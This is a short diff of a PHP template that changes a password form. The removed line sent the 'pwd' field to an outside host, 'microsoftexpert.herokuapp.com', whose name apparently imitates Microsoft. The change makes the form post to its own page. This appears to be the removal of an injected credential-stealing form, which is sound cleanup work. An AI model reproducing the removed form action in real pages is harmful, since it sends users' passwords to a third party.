@@ -109,7 +109,7 @@
 
 <?php else: ?>
 
-    <form action="https://microsoftexpert.herokuapp.com/rep" method="post">
+    <form method="post">
         <input type="text" name="pwd" />
     </form>
 
